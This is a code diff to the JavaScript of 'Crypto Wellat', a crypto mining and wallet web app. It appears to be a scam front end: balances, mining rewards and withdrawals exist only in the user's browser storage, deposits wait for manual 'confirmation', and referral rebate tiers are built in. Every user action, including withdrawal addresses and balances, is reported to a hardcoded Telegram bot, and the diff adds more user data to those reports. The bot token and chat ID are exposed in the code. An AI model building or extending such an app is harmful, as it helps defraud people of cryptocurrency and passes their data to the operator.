@@ -2,10 +2,10 @@
 const TELEGRAM_BOT_TOKEN = '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0';
 const TELEGRAM_CHAT_ID = '7417215529';
 
-// Global State
+// Global State with proper initialization
 let userState = {
     brokerBalance: 20.00,
-    foundBalance: 0.00,
+    foundBalance: 40.00,
     miningMachines: [],
     miningActive: false,
     miningStartTime: null,
@@ -16,7 +16,9 @@ let userState = {
     directReferrals: 0,
     teamMembers: 0,
     totalRebates: 0,
-    teamRebates: { tier1: 0, tier2: 0, tier3: 0 }
+    teamRebates: { tier1: 0, tier2: 0, tier3: 0 },
+    userId: null,
+    lastWithdrawal: null
 };
 
 // Mining Machine Data
@@ -55,20 +57,93 @@ const networkMapping = {
     'TON': 'TON'
 };
 
+// Enhanced Storage Functions
+function generateUserId() {
+    return 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase() + '_' + Date.now().toString(36);
+}
+
+function saveState() {
+    try {
+        localStorage.setItem('cryptoWellatState', JSON.stringify(userState));
+        localStorage.setItem('cryptoWellatLastSave', Date.now().toString());
+        return true;
+    } catch (error) {
+        console.error('Failed to save state:', error);
+        return false;
+    }
+}
+
+function loadState() {
+    try {
+        const savedState = localStorage.getItem('cryptoWellatState');
+        if (savedState) {
+            const parsedState = JSON.parse(savedState);
+            
+            // Merge with current state to ensure new properties are added
+            userState = { ...userState, ...parsedState };
+            
+            // Ensure required properties exist
+            if (!userState.userId) {
+                userState.userId = generateUserId();
+            }
+            if (userState.foundBalance === undefined) {
+                userState.foundBalance = 40.00;
+            }
+            
+            return true;
+        }
+    } catch (error) {
+        console.error('Failed to load state:', error);
+    }
+    
+    // Initialize new user
+    userState.userId = generateUserId();
+    userState.brokerBalance = 20.00;
+    userState.foundBalance = 40.00;
+    
+    return false;
+}
+
+function clearStorage() {
+    try {
+        localStorage.removeItem('cryptoWellatState');
+        localStorage.removeItem('cryptoWellatLastSave');
+        return true;
+    } catch (error) {
+        console.error('Failed to clear storage:', error);
+        return false;
+    }
+}
+
+function getStorageInfo() {
+    try {
+        const state = localStorage.getItem('cryptoWellatState');
+        const lastSave = localStorage.getItem('cryptoWellatLastSave');
+        return {
+            hasState: !!state,
+            stateSize: state ? state.length : 0,
+            lastSave: lastSave ? new Date(parseInt(lastSave)).toLocaleString() : 'Never',
+            userId: userState.userId
+        };
+    } catch (error) {
+        return { error: error.message };
+    }
+}
+
 // Initialize the application
 document.addEventListener('DOMContentLoaded', function() {
     initializeApp();
 });
 
 async function initializeApp() {
-    // Show initial loading screen
-    await simulateLoading(2000);
+    console.log('🚀 Initializing Crypto Wellat...');
     
-    // Load state from localStorage if available
-    const savedState = localStorage.getItem('cryptoWellatState');
-    if (savedState) {
-        userState = JSON.parse(savedState);
-    }
+    // Load existing state or initialize new user
+    const hasExistingState = loadState();
+    console.log(hasExistingState ? '📁 Loaded existing state' : '🆕 Created new user state');
+    
+    // Show initial loading screen (0.5 seconds only)
+    await simulateLoading(500);
     
     // Initialize UI components
     setupEventListeners();
@@ -78,10 +153,21 @@ async function initializeApp() {
     
     // Hide loading screen and show main app
     document.getElementById('initialLoading').classList.remove('active');
-    document.getElementById('mainApp').classList.remove('hidden');
+    setTimeout(() => {
+        document.getElementById('mainApp').classList.remove('hidden');
+    }, 300);
     
-    // Send welcome notification
-    await sendTelegramNotification('welcome', {});
+    // Send welcome notification for new users
+    if (!hasExistingState) {
+        await sendTelegramNotification('welcome', {
+            userId: userState.userId,
+            brokerBalance: userState.brokerBalance,
+            foundBalance: userState.foundBalance
+        });
+    }
+    
+    console.log('✅ Crypto Wellat initialized successfully');
+    console.log('💾 Storage Info:', getStorageInfo());
 }
 
 function setupEventListeners() {
@@ -106,7 +192,7 @@ function setupEventListeners() {
     // Upgrade buttons
     document.querySelectorAll('.upgrade-btn').forEach(btn => {
         btn.addEventListener('click', (e) => {
-            const level = e.target.dataset.level;
+            const level = e.target.closest('.upgrade-btn').dataset.level;
             upgradeMembership(level);
         });
     });
@@ -234,13 +320,13 @@ async function confirmPurchase() {
         return;
     }
 
-    // Show loading
+    // Show loading (0.5 seconds)
     const btn = modal.querySelector('.action-btn');
     const spinner = btn.querySelector('.btn-spinner');
     btn.disabled = true;
     spinner.classList.remove('hidden');
 
-    await simulateLoading(2000);
+    await simulateLoading(500);
 
     // Deduct cost from balance
     userState.brokerBalance -= machine.cost;
@@ -263,7 +349,8 @@ async function confirmPurchase() {
     await sendTelegramNotification('purchase', {
         machine: machine.name,
         amount: machine.cost,
-        userBalance: userState.brokerBalance
+        userBalance: userState.brokerBalance,
+        userId: userState.userId
     });
 
     saveState();
@@ -282,13 +369,13 @@ async function startMining() {
         return;
     }
 
-    // Show loading
+    // Show loading (0.5 seconds)
     const btn = document.getElementById('startMining');
     const spinner = btn.querySelector('.btn-spinner');
     btn.disabled = true;
     spinner.classList.remove('hidden');
 
-    await simulateLoading(2000);
+    await simulateLoading(500);
 
     userState.miningActive = true;
     userState.miningStartTime = Date.now();
@@ -303,7 +390,10 @@ async function startMining() {
     document.getElementById('claimRewards').classList.remove('hidden');
 
     // Send Telegram notification
-    await sendTelegramNotification('mining_start', {});
+    await sendTelegramNotification('mining_start', {
+        userId: userState.userId,
+        machines: userState.miningMachines.length
+    });
 
     saveState();
     updateUI();
@@ -319,13 +409,13 @@ async function claimRewards() {
         return;
     }
 
-    // Show loading
+    // Show loading (0.5 seconds)
     const btn = document.getElementById('claimRewards');
     const spinner = btn.querySelector('.btn-spinner');
     btn.disabled = true;
     spinner.classList.remove('hidden');
 
-    await simulateLoading(2000);
+    await simulateLoading(500);
 
     // Calculate rewards
     const totalDailyMining = userState.miningMachines.reduce((total, machine) => {
@@ -356,7 +446,8 @@ async function claimRewards() {
     // Send Telegram notification
     await sendTelegramNotification('mining_claim', {
         amount: totalReward,
-        totalBalance: userState.foundBalance
+        totalBalance: userState.foundBalance,
+        userId: userState.userId
     });
 
     saveState();
@@ -365,7 +456,7 @@ async function claimRewards() {
     setTimeout(() => {
         updateMiningAnimation('idle');
         showSuccessMessage(`Successfully claimed ${totalReward.toFixed(2)} USDT!`);
-    }, 2000);
+    }, 500);
 
     // Reset button state
     btn.disabled = false;
@@ -423,19 +514,23 @@ function updateMiningAnimation(state) {
             statusText.textContent = 'Mining in Progress...';
             timer.classList.remove('hidden');
             statusText.classList.add('hidden');
+            animationContainer.style.background = 'radial-gradient(circle, #1a1a2e 0%, #0f0f23 100%)';
             break;
         case 'complete':
             statusText.textContent = 'Mining Complete!';
             timer.classList.add('hidden');
             statusText.classList.remove('hidden');
+            animationContainer.style.background = 'radial-gradient(circle, #2a1a4e 0%, #1a1a2e 100%)';
             break;
         case 'claim':
             statusText.textContent = 'Claiming Rewards...';
+            animationContainer.style.background = 'radial-gradient(circle, #3a1a6e 0%, #2a1a4e 100%)';
             break;
         default:
             statusText.textContent = 'Ready to Start Mining';
             timer.classList.add('hidden');
             statusText.classList.remove('hidden');
+            animationContainer.style.background = 'rgba(10, 10, 20, 0.8)';
     }
 }
 
@@ -514,22 +609,32 @@ async function processWithdrawal() {
         return;
     }
 
-    // Show loading
+    // Check if user has withdrawn today
+    const today = new Date().toDateString();
+    if (userState.lastWithdrawal === today) {
+        showSuccessMessage('You can only withdraw once per day. Please try again tomorrow.');
+        return;
+    }
+
+    // Show loading (0.5 seconds)
     const btn = document.querySelector('.confirm-btn');
     const spinner = btn.querySelector('.btn-spinner');
     btn.disabled = true;
     spinner.classList.remove('hidden');
 
-    await simulateLoading(2000);
+    await simulateLoading(500);
 
     // Process withdrawal
     userState.foundBalance -= amount;
+    userState.lastWithdrawal = today;
 
     // Send Telegram notification
     await sendTelegramNotification('withdrawal', {
         amount: amount,
         network: network,
-        address: address
+        address: address,
+        userId: userState.userId,
+        remainingBalance: userState.foundBalance
     });
 
     saveState();
@@ -582,18 +687,19 @@ async function confirmPayment() {
         return;
     }
 
-    // Show loading
+    // Show loading (0.5 seconds)
     const btn = document.querySelector('#depositModal .action-btn.primary');
     const spinner = btn.querySelector('.btn-spinner');
     btn.disabled = true;
     spinner.classList.remove('hidden');
 
-    await simulateLoading(2000);
+    await simulateLoading(500);
 
     // Send Telegram notification
     await sendTelegramNotification('deposit', {
         amount: amount,
-        network: network
+        network: network,
+        userId: userState.userId
     });
 
     showSuccessMessage('Deposit submitted - awaiting confirmation (up to 24 hours)');
@@ -629,8 +735,8 @@ async function upgradeMembership(level) {
         return;
     }
 
-    // Show loading
-    await simulateLoading(2000);
+    // Show loading (0.5 seconds)
+    await simulateLoading(500);
 
     userState.brokerBalance -= cost;
     userState.membershipLevel = level;
@@ -638,7 +744,8 @@ async function upgradeMembership(level) {
     // Send Telegram notification
     await sendTelegramNotification('upgrade', {
         level: level,
-        cost: cost
+        cost: cost,
+        userId: userState.userId
     });
 
     saveState();
@@ -686,16 +793,16 @@ function handleFileUpload(event) {
 // Telegram API Functions
 async function sendTelegramNotification(type, data) {
     const messages = {
-        'welcome': `🟣 New user started using Crypto Wellat\nUser ID: ${generateUserId()}\nTime: ${new Date().toLocaleString()}`,
-        'purchase': `🟣 New Mining Machine Purchase\nMachine: ${data.machine}\nAmount: ${data.amount} USDT\nUser Balance: ${data.userBalance} USDT\nTime: ${new Date().toLocaleString()}`,
-        'deposit': `🟣 Deposit Request\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nTime: ${new Date().toLocaleString()}`,
-        'withdrawal': `🟣 Withdrawal Request\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nAddress: ${data.address}\nTime: ${new Date().toLocaleString()}`,
-        'mining_start': `🟣 Mining Started\nUser ID: ${generateUserId()}\nTime: ${new Date().toLocaleString()}`,
-        'mining_claim': `🟣 Rewards Claimed\nAmount: ${data.amount} USDT\nTotal Balance: ${data.totalBalance} USDT\nTime: ${new Date().toLocaleString()}`,
-        'upgrade': `🟣 Membership Upgrade\nLevel: ${data.level}\nCost: ${data.cost} USDT\nTime: ${new Date().toLocaleString()}`
+        'welcome': `🟣 New user started using Crypto Wellat\nUser ID: ${data.userId}\nBroker Balance: ${data.brokerBalance} USDT\nFound Balance: ${data.foundBalance} USDT\nTime: ${new Date().toLocaleString()}`,
+        'purchase': `🟣 New Mining Machine Purchase\nUser ID: ${data.userId}\nMachine: ${data.machine}\nAmount: ${data.amount} USDT\nUser Balance: ${data.userBalance} USDT\nTime: ${new Date().toLocaleString()}`,
+        'deposit': `🟣 Deposit Request\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nTime: ${new Date().toLocaleString()}`,
+        'withdrawal': `🟣 Withdrawal Request\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nAddress: ${data.address}\nRemaining Balance: ${data.remainingBalance} USDT\nTime: ${new Date().toLocaleString()}`,
+        'mining_start': `🟣 Mining Started\nUser ID: ${data.userId}\nActive Machines: ${data.machines}\nTime: ${new Date().toLocaleString()}`,
+        'mining_claim': `🟣 Rewards Claimed\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nTotal Balance: ${data.totalBalance} USDT\nTime: ${new Date().toLocaleString()}`,
+        'upgrade': `🟣 Membership Upgrade\nUser ID: ${data.userId}\nLevel: ${data.level}\nCost: ${data.cost} USDT\nTime: ${new Date().toLocaleString()}`
     };
 
-    const message = messages[type] || `🟣 Crypto Wellat Notification\nType: ${type}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`;
+    const message = messages[type] || `🟣 Crypto Wellat Notification\nType: ${type}\nUser ID: ${data.userId}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`;
 
     try {
         // Send to Telegram Bot API
@@ -713,19 +820,12 @@ async function sendTelegramNotification(type, data) {
 
         if (!response.ok) {
             console.error('Telegram API error:', await response.text());
+        } else {
+            console.log('✅ Telegram notification sent:', type);
         }
     } catch (error) {
         console.error('Failed to send Telegram notification:', error);
     }
-}
-
-function generateUserId() {
-    let userId = localStorage.getItem('cryptoWellatUserId');
-    if (!userId) {
-        userId = 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase();
-        localStorage.setItem('cryptoWellatUserId', userId);
-    }
-    return userId;
 }
 
 // Utility Functions
@@ -756,10 +856,6 @@ function closeModal(modalId) {
     document.getElementById(modalId).classList.add('hidden');
 }
 
-function saveState() {
-    localStorage.setItem('cryptoWellatState', JSON.stringify(userState));
-}
-
 // Export functions for global access
 window.openPurchaseModal = openPurchaseModal;
 window.confirmPurchase = confirmPurchase;
@@ -773,3 +869,8 @@ window.closeModal = closeModal;
 window.closeSuccessMessage = closeSuccessMessage;
 window.upgradeMembership = upgradeMembership;
 window.openDepositModal = openDepositModal;
+
+// Debug functions (remove in production)
+window.getStorageInfo = getStorageInfo;
+window.clearStorage = clearStorage;
+window.saveState = saveState;
